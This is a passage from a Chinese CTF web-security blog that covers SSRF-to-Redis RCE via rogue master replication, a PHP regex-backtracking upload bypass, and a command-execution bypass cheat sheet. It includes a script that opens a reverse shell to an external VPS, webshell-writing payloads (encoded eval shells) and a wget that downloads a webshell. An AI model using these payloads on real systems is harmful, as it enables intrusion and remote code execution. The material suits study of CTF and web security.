class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$match_result</span>=preg_match(<span class="hljs-string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        <span class="hljs-variable">$url_parse</span>=parse_url(<span class="hljs-variable">$url</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$ip</span>=gethostbyname(<span class="hljs-variable">$hostname</span>);<br>    <span class="hljs-variable">$int_ip</span>=ip2long(<span class="hljs-variable">$ip</span>);<br>    <span class="hljs-keyword">return</span> ip2long(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || ip2long(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (check_inner_ip(<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27; is inner ip&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-variable">$ch</span> = curl_init();<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>        <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$result_info</span> = curl_getinfo(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>])<br>        &#123;<br>            safe_request_url(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]);<br>        &#125;<br>        curl_close(<span class="hljs-variable">$ch</span>);<br>        var_dump(<span class="hljs-variable">$output</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>实现内网绕过后，hint.php提示Redis的密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    file_put_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>],<span class="hljs-string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>看到这里的时候，其实尝试过利用POST的file参数写木马，但是发现没有写权限。</p><p>类似的，redis也没办法直接写shell，因此考虑使用主从复制。</p><p>攻击逻辑其实就是利用SSRF使得redis将攻击机作为主机，从而利用主从复制将恶意的so文件加载，实现rce。</p><p>在VPS上搭建攻击机，可以参照 https://github.com/n0b0dyCN/redis-rogue-server。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401144412655.png" alt="image-20230401144412655" /></p><p>搭建成功之后，我们构造攻击脚本，此时的数据需要按照redis协议进行相关的编码，可以模仿上面的GitHub repo</p><p>需要注意的是，我们将对应的参数构造之后去攻击时，需要对gopher协议再次完成url编码。（url参数上传时会解析一次，libcurl会再次解析）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">redis_format</span>(<span class="hljs-params">arr</span>):</span><br>    CRLF = <span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd = <span class="hljs-string">&quot;&quot;</span><br>    cmd += <span class="hljs-string">&quot;*&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd += CRLF + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x))) + CRLF + x<br>    cmd += CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_rce</span>(<span class="hljs-params">lhost, lport, passwd, command=<span class="hljs-string">&quot;cat /etc/passwd&quot;</span></span>):</span><br>    exp_filename = <span class="hljs-string">&quot;exp.so&quot;</span><br>    cmd = [<br>    <span class="hljs-comment"># 第一次</span><br>        <span class="hljs-string">&quot;CONFIG SET dir /tmp/&quot;</span>,<br>        <span class="hljs-string">&quot;config set dbfilename exp.so&quot;</span>,<br>        <span class="hljs-string">&quot;SLAVEOF &#123;&#125; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(lhost, lport),<br><br><span class="hljs-comment"># 第二次</span><br>        <span class="hljs-string">&quot;MODULE LOAD /tmp/exp.so&quot;</span>,<br><br><span class="hljs-comment"># 第三次</span><br>        <span class="hljs-string">&quot;system.exec &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(command.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br><span class="hljs-comment"># 这里有个细节就是使用$&#123;IFS&#125;代替参数中的空格，因为上面的redis_format函数会根据空格来进行分割命令和参数</span><br><br>        <span class="hljs-string">&quot;system.rev 43.143.123.40$&#123;IFS&#125;7788&quot;</span>,<br>        <span class="hljs-string">&quot;SLAVEOF NO ONE&quot;</span>,<br>        <span class="hljs-string">&quot;CONFIG SET dbfilename dump.rdb&quot;</span>,<br>        <span class="hljs-string">&quot;system.exec rm$&#123;IFS&#125;/tmp/exp.so&quot;</span>,<br>        <span class="hljs-string">&quot;MODULE UNLOAD system&quot;</span>,<br>        <span class="hljs-string">&quot;quit&quot;</span>,<br><br>    ]<br>    <span class="hljs-keyword">if</span> passwd:<br>        cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    lhost = <span class="hljs-string">&quot;43.143.123.40&quot;</span><br>    lport = <span class="hljs-string">&quot;7788&quot;</span><br><br>    rhost = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    rport = <span class="hljs-string">&quot;6379&quot;</span><br><br>    passwd = <span class="hljs-string">&quot;root&quot;</span><br><br>    payload = <span class="hljs-string">&quot;gopher://&quot;</span> + rhost + <span class="hljs-string">&quot;:&quot;</span>  + rport +  <span class="hljs-string">&quot;/_&quot;</span><br><br>    cmd = generate_rce(lhost, lport, passwd, command=<span class="hljs-string">&quot;cat /flag&quot;</span>)<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cmd:<br>        a = redis_format(i)<br>        payload += quote(a)<br>    <br>    <span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><h2 id="正则相关">12、正则相关</h2><h3 id="正则最大回溯绕过">1、正则最大回溯绕过</h3><p>简单来说，对于php代码，正则库是依据NAF实现的，因此需要引入回溯机制。</p><p>php中设置了最大回溯次数，默认为10万次。</p><p>当正则表达式开启了贪心，我们就可以利用正则最大回溯次数的限制从而完成绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(show_source(<span class="hljs-keyword">__FILE__</span>));<br>&#125;<br><br><span class="hljs-variable">$user_dir</span> = <span class="hljs-string">&#x27;./data/&#x27;</span>;<br><span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (is_php(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bad request&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    @mkdir(<span class="hljs-variable">$user_dir</span>, <span class="hljs-number">0755</span>);<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$user_dir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . random_int(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br>    move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$path</span>);<br><br>    header(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$path</span>&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">303</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>files = &#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;1.zip&#x27;</span>, <span class="hljs-string">b&quot;&lt;?php file_put_contents(&#x27;hacker.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;); ?&gt;&quot;</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">1000000</span>)<br>&#125;<br><br>url = <span class="hljs-string">&quot;http://5c447b18-7633-4d09-9eb7-d6caffed7c69.challenge.ctf.show/&quot;</span><br><br>r = requests.post(<br>    url=url,<br>    files=files,<br>    proxies=&#123;<br>        <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br>    &#125;<br>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>NSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行总结</title>
    <link href="/2022/03/01/blog0001-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/"/>
    <url>/2022/03/01/blog0001-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>命令执行是最开始学习CTF接触到的内容，RCE大概是Web人最先领会到的攻防魅力。</p><p>由于CTF中的Web往往是围绕Linux展开，因此其中大部分的绕过技巧主要也是在Linux下使用。</p><span id="more"></span><h2 id="一命令执行">一、命令执行</h2><p>命令执行，指在Web应用程序中直接执行系统命令。</p><p>比如常见的PHP 命令执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;whoami&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在不同的语言中会有不同的命令执行方式，以下将会对常见的Web应用程序语言的命令执行方式做说明。</p><p>1、PHP命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;whoami&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>2、Python命令执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()<br>os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>3、Java命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Runtime.getRuntime.exec(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="二空格绕过">二、空格绕过</h2><h3 id="url编码绕过">1、URL编码绕过</h3><p>空格在URL编码中为%20</p><p>当空格被过滤时，我们可以使用%09（tab）或者%0a（回车）绕过</p><p><strong>使用%0a的使用范围有限,如PHP中调用system()函数，如果使用%0a无法实现效果。</strong></p><h3 id="shell变量绕过">2、shell变量绕过</h3><p>在Linux bash中，我们可以使用shell中预设的变量来绕过空格</p><p>如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">tac$</span><span class="bash">&#123;IFS&#125;flag.php</span><br><span class="hljs-meta">tac$</span><span class="bash">IFS<span class="hljs-variable">$1flag</span>.php</span><br><span class="hljs-meta">tac$</span><span class="bash">IFS<span class="hljs-variable">$9flag</span>.php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 注意，kali默认为zsh环境，此时效果不一定成功</span><br></code></pre></td></tr></table></figure><h3 id="其他特殊符号替代">3、其他特殊符号替代</h3><p>当上述方法被禁止的时候，我们可以考虑使用shell重定向符号。</p><p><strong>当我们使用重定向符号时，不能再使用通配符来进行绕过。</strong></p><p>如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">tac&lt;flag.php #代替 tac flag.php<br>tac&lt;&gt;flag.php<br></code></pre></td></tr></table></figure><h2 id="三敏感词绕过">三、敏感词绕过</h2><h3 id="通配符绕过">1、通配符绕过</h3><p>Linux bash常见的通配符：</p><ul><li>* ：匹配任意个字符</li><li>？：匹配单个字符</li><li>[] : 表示范围，如[a-c]表示匹配a-c之间的字符</li></ul><p>如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">绕过简单的敏感词，实现文件的打开操作</span><br>tac fla*  #<br>tac fla?.php  #<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">字母被过滤时</span><br>???/????64 ????.??? <br><span class="hljs-meta">#</span><span class="bash">等价于实现了 bin/base64 flag.php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 参考案例</span><br><span class="hljs-meta">if(isset($</span><span class="bash">_GET[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;</span><br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        system($c);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="shell字符串拼接">2、shell字符串拼接</h3><p>Linux中shell字符串是可以拼接的,并且不需要额外的运算符。</p><p>那么我们可以得到以下3条等价的语句。</p><p>需要注意的是，如果第3条语句没有加上<code>$&#123;&#125;</code>的分隔，将会被系统认为是<code>$ag</code>，这样得不到正确的结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">tac /flag.png<br>a=ag.png;tac /fl$a<br>a=ag.pn;tac /fl$&#123;a&#125;g<br></code></pre></td></tr></table></figure><p>我们也可以构造更为简单的payload,我们不需要引入额外的shell变量，直接利用“”这样的空字符串来实现拼接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">tac /fl&quot;&quot;ag.png<br>tac /fla&#x27;&#x27;g.png<br></code></pre></td></tr></table></figure><h3 id="shell反斜杠转义">3、shell反斜杠转义</h3><p>shell中反斜杠是去除转移字符的特殊含义，这个与大多数的语言类似。</p><p>当反斜杠后接正常字符，在shell中相当于不处理。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 以下两个句子在shell测试，发现两者输出相同</span><br>echo flag.php<br>echo fla\g.php<br></code></pre></td></tr></table></figure><h3 id="运算符的运用">4、运算符的运用</h3><p>我们对运算符有如下的说明：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> ; 命令间的分隔符</span><br>ls;whoami<br><span class="hljs-meta">#</span><span class="bash"> | 管道，将前一个输出重定向到下一个的标准输入</span><br>ls | whoami<br><span class="hljs-meta">#</span><span class="bash"> &amp; 进程并发，并发多个进程</span><br>ls &amp; whoami<br><span class="hljs-meta">#</span><span class="bash"> &amp;&amp; 逻辑运算，当且仅当前一个命令返回为真时执行下一个</span><br>ls &amp;&amp; whoami<br><span class="hljs-meta">#</span><span class="bash"> || 逻辑运算，当且仅当前一个命令返回为假时执行下一个</span><br>ls || whoami<br></code></pre></td></tr></table></figure><h3 id="文件读取">5、文件读取</h3><p>比赛里面常常会ban一堆文件读取的函数，这个只能自己总结了</p><p>grep可以直接查找文件内容</p><p>cat</p><p><a href="https://blog.csdn.net/JC_xxx/article/details/108921607">Linux 的文件读取指令</a></p><h3 id="编码绕过">6、编码绕过</h3><p>编码一方面是绕过，一方面是方便我们读取相关的信息</p><p>使用xxd完成16进制编码写入webshell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo -n &quot;3C3F706870206576616C28245F504F53545B315D293B203F3E&quot;| xxd -r -p &gt; 1.php<br></code></pre></td></tr></table></figure><h3 id="命令逃逸">7、命令逃逸</h3><p>如果是代码执行，我们可以将命令逃逸到其他参数去，从而绕过针对某个参数的waf。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<br><br>post: <br>c = <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<br>a = system(<span class="hljs-string">&#x27;ls&#x27;</span>);    <br></code></pre></td></tr></table></figure><p>同理也可以使用反引号之类的操作进行逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<br><br><span class="hljs-comment">// 1=`$_GET[1]`;</span><br></code></pre></td></tr></table></figure><h3 id="xargs">8、xargs</h3><p>这个命令非常适用于某单个字符被限制，比如<code>/</code>被限制，因为字符串拼接对目录分割符时没有意义的。</p><p>举一个简单的例子，可以看到我们成功将字符串作为命令行参数传入了命令中，使得我们能够通过编码绕过命令参数的限制。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;/&quot; | base64             <br>Lwo=<br><br>echo &quot;Lwo=&quot; | base64 -d | xargs ls<br></code></pre></td></tr></table></figure><h2 id="四webshell">四、webshell</h2><p>有的时候，waf的限制较多，这时候我们就考虑写入webshell，也算是一种类似的命令逃逸。</p><h3 id="编码写webshell">1、编码写webshell</h3><p>16进制编码写webshell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo -n &quot;3C3F706870206576616C28245F504F53545B315D293B203F3E&quot;| xxd -r -p &gt; 1.php<br></code></pre></td></tr></table></figure><p>base64编码写webshell</p><p>密码为123</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;PD9waHAgZXZhbCgkX1BPU1RbMTIzXSk7Pz4K&quot; | base64 -d<br></code></pre></td></tr></table></figure><h3 id="远程写webshell">2、远程写webshell</h3><p>有的时候可能限制了<code>&gt;</code> 以及 <code>|</code>等重定位符号，我们可以使用wget远程下载webshell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget -O 1.php http://vps-ip/1.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web漏洞</category>
      
      <category>RCE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Buuoj WP(Web)</title>
    <link href="/2022/02/22/blog0003-buuoj-web-wp-1/"/>
    <url>/2022/02/22/blog0003-buuoj-web-wp-1/</url>
    
    <content type="html"><![CDATA[<p>记录一下BuuOJ上刷到的一些题目~</p><span id="more"></span><h2 id="roar-ctf-easy-calc">1、Roar-CTF Easy Calc</h2><p>这题打开界面是一个计算表达式的网页</p><p>首先，检查前端代码，发现前端向后端 calc.php 发送数据部署了WAF</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">    $(<span class="hljs-string">&#x27;#calc&#x27;</span>).submit(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">        $.ajax(&#123;</span><br><span class="javascript">            <span class="hljs-attr">url</span>:<span class="hljs-string">&quot;calc.php?num=&quot;</span>+<span class="hljs-built_in">encodeURIComponent</span>($(<span class="hljs-string">&quot;#content&quot;</span>).val()),</span><br><span class="javascript">            <span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;GET&#x27;</span>,</span><br><span class="javascript">            <span class="hljs-attr">success</span>:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;</span><br><span class="javascript">                $(<span class="hljs-string">&quot;#result&quot;</span>).html(<span class="hljs-string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span><br><span class="hljs-string"><span class="javascript">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="hljs-subst">$&#123;data&#125;</span></span></span><br><span class="hljs-string"><span class="javascript">            &lt;/div&gt;`</span>);</span><br><span class="javascript">            &#125;,</span><br><span class="javascript">            <span class="hljs-attr">error</span>:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">                alert(<span class="hljs-string">&quot;这啥?算不来!&quot;</span>);</span><br><span class="javascript">            &#125;</span><br><span class="javascript">        &#125;)</span><br><span class="javascript">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span 